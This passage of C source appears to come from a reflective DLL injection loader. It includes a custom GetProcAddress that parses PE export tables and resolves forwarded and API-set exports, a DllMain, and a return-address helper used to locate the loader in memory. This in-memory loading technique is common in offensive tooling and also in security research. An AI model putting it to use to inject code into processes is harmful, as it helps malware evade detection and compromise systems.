    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    UINT_PTR uiFuncVA = 0;
    PCHAR cpExportedFunctionName;
    PCHAR szFwdDesc;
    PCHAR szRedirFunc;
    PWSTR wszDllName;
    SIZE_T stDllName;
    PWCHAR wsRedir;
    PWSTR wszRedirName = NULL;
    SIZE_T stRedirName;

    HMODULE hFwdModule;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
    FARPROC fpResult = NULL;
    DWORD dwCounter;

    if (hModule == NULL)
        return NULL;

    // a module handle is really its base address
    uiLibraryAddress = (UINT_PTR)hModule;

    // get the VA of the modules NT Header
    pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);

    pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // get the VA of the export directory
    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory->VirtualAddress);

    // get the VA for the array of addresses
    uiAddressArray = (uiLibraryAddress + pExportDirectory->AddressOfFunctions);

    // get the VA for the array of name pointers
    uiNameArray = (uiLibraryAddress + pExportDirectory->AddressOfNames);

    // get the VA for the array of name ordinals
    uiNameOrdinals = (uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);

    // test if we are importing by name or by ordinal...
#pragma warning(suppress: 4311)
    if (((DWORD)lpProcName & 0xFFFF0000) == 0x00000000)
    {
        // import by ordinal...

        // use the import ordinal (- export ordinal base) as an index into the array of addresses
#pragma warning(suppress: 4311)
        uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory->Base) * sizeof(DWORD));

        // resolve the address for this imported function
        fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));
    }
    else
    {
        // import by name...
        dwCounter = pExportDirectory->NumberOfNames;
        while (dwCounter--)
        {
            cpExportedFunctionName = (PCHAR)(uiLibraryAddress + DEREF_32(uiNameArray));

            // test if we have a match...
            if (fptrs->pstrcmp(cpExportedFunctionName, lpProcName) == 0)
            {
                // use the functions name ordinal as an index into the array of name pointers
                uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
                uiFuncVA = DEREF_32(uiAddressArray);

                // check for redirected exports
                if (pDataDirectory->VirtualAddress <= uiFuncVA && uiFuncVA < (pDataDirectory->VirtualAddress + pDataDirectory->Size))
                {
                    szFwdDesc = (PCHAR)(uiLibraryAddress + uiFuncVA);

                    // Find the first character after "."
                    char buf4[] = {'.', 0};
                    szRedirFunc = (PCHAR)fptrs->pstrstr(szFwdDesc, buf4) + 1;
                    stDllName = (SIZE_T)(szRedirFunc - szFwdDesc);

                    // Allocate enough space to append "dll"
                    wszDllName = (PWSTR)fptrs->pcalloc(stDllName + 3 + 1, sizeof(WCHAR));
                    if (wszDllName == NULL)
                        break;

                    WCHAR buf1[] = {L'd', L'l', L'l', 0};
                    fptrs->pmbstowcs_s(NULL, wszDllName, stDllName + 1, szFwdDesc, stDllName);
                    __movsb((PBYTE)(wszDllName + stDllName), (PBYTE)(buf1), 3 * sizeof(WCHAR));

                    // check for a redirected module name
                    WCHAR buf2[] = {L'a', L'p', L'i', L'-', 0};
                    WCHAR buf3[] = {L'e', L'x', L't', L'-', 0};
                    
                    if (fptrs->p_wcsnicmp(wszDllName, buf2, 4) == 0 || fptrs->p_wcsnicmp(wszDllName, buf3, 4) == 0)
                    {
                        wsRedir = GetRedirectedName(fptrs, wszOriginalModule, wszDllName, &stRedirName);
                        if (wsRedir)
                        {
                            // Free the original buffer and allocate a new one for the redirected dll name
                            fptrs->pfree(wszDllName);

                            wszDllName = (PWSTR)fptrs->pcalloc(stRedirName + 1, sizeof(WCHAR));
                            if (wszDllName == NULL)
                                break;

                            __movsb((PBYTE)wszDllName, (PBYTE)wsRedir, stRedirName * sizeof(WCHAR));
                        }
                    }

                    hFwdModule = fptrs->pGetModuleHandleW(wszDllName);
                    fpResult = CustomGetProcAddressEx(fptrs, hFwdModule, szRedirFunc, wszDllName);
                    fptrs->pfree(wszDllName);
                }
                else
                {
                    // calculate the virtual address for the function
                    fpResult = (FARPROC)(uiLibraryAddress + uiFuncVA);
                }

                // finish...
                break;
            }

            // get the next exported function name
            uiNameArray += sizeof(DWORD);

            // get the next exported function name ordinal
            uiNameOrdinals += sizeof(WORD);
        }
    }

    return fpResult;
}


//===============================================================================================//



#ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
    switch( dwReason ) 
    { 
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *(HMODULE *)lpReserved = hAppInstance;
            break;
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return bReturnValue;
}

#endif
//===============================================================================================//

//===============================================================================================//
#pragma intrinsic( _ReturnAddress )
// This function can not be inlined by the compiler or we will not get the address we expect. Ideally 
// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of 
// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics 
// available (and no inline asm available under x64).
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)_ReturnAddress(); }
//===============================================================================================//